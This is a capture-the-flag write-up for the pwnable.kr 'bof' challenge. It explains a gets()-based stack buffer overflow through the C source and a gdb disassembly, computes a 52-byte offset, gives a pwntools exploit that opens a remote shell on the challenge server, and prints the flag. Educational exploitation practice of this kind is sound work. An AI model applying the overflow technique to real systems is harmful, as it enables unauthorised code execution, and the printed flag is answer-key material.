
#Objective:
This is a 5 point challenge from pwnable.kr


Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?


Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c


Running at : nc pwnable.kr 9000

#Solution:

To start off, let’s try running the program.

```
sudo chmod +x bof
./bof
overflow me :
Buy me dinner first
Nah..
```

Ok it looks like a binary exploitation problem. Since pwnables was polite enough to give us the source code, let’s take a look at that.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);    // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

They even comented the code for us, nana is really nice. But looking at the “main” function, it just calls the “func” function and passed along the hex value “deadbeef”. Looking at the “func” function it imports a value and stores it as “key”. Later on the function calls the “gets” function, which is vulnerable since it doesn’t have a limit (use fgets, you can specify a read size with that thus patching the exploit). Proceeding that it checks to see if “key” is equal to the hex value “0xcafebabe”. So it looks like we will have to use a buffer overflow exploit to overwrite “key” to “0xcafebabe”. 

To start working on that, we need to look at the assembly code. Time to fire up gdb-peda (idk if you need to use sudo but I solved this challenge using it).

```
sudo gdb ./bof”
```

Since we are primarily concerned with the “func” function, we can just disassemble that.

```
disas func
Dump of assembler code for function func:
   0x5655562c <+0>:    push   ebp
   0x5655562d <+1>:    mov    ebp,esp
   0x5655562f <+3>:    sub    esp,0x48
   0x56555632 <+6>:    mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e57b80 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e572c0 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e32d80 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e57b80 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7eef740 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
```

While looking at this we can tell that the if then statement is located at “0x56555654”, since that is the address of the only compare (cmp) operator. Since it is comparing “ebp+0x8” to “0xcafebabe” we can tell that “key” is stored at “ebp+0x8”. As for the location we have input for, the gets function that accepts our input is called at “0x5655564f”. We can tell this because of how the program was coded, it should be the second function called in this function (and gdb labelled it gets). Right before it gets called, the stack value “ebp-0x2c” get;s pushed onto the stack. Since a functions arguments are pushed onto the stack before a function is called our input should be stored there. So we should be able to calculate the distance between “ebp-0x2c” and “ebp+0x8”, then overflow just the amount and be able to write to key, and then pwn the program. To calculate the distance we will need to use gdb to find the location of both, and set a breakpoint at the cmp operator.

```
b *0x56555654
```

Now we just have to run it

```
r


Starting program: /Hackery/pwnables/toddlers_bottle/bof/bof
overflow me :
Buy me dinner first
```

Now we are at a spot where we can see the location for both. To do so, we will just be using the gdb function “x” (which stands for examine).

```
x $ebp+0x8
0xffffd690:    0xdeadbeef
```

As you can see here, this location has the correct value for key. Now to look at the other register’s value.

```
x $ebp-0x2c
0xffffd65c:    0x00736476
```

Now that we have the two locations, we should be able to just subtract the two and get the difference. Btw the actual hex values may be different, but the difference should be the same. Now that we know the difference we can go ahead and write our exploit.

```
0xffffd690 - 0xffffd65c = 52
```

And the difference value is 52 bits. To fill this gap, we can just send 52 characters. As for the hex value, we have to format it so the server will handle it properly (pwn tools has a cool function for this which will handle all of the hard work for us). Below is the code for the exploit.  

```
#First we import pwntools
from pwn import *


#Then we establish the remote connection to the server
conn = remote("pwnable.kr", 9000)


#Now we setup the payload which we will send to the challenge. Pwntools has a cool feature to help us pack the hex value in a 32 bit form that the server can read (p32).
payload = "1"*52 + p32(0xcafebabe)


#Now we send the payload
conn.sendline(payload)


#Now we drop down to an interactive shell so we can interact with our shell
conn.interactive()
```

After that we can just list all of the files in the directory, and cat the “flag” file.

Flag: daddy, I just pwned a buFFer :)



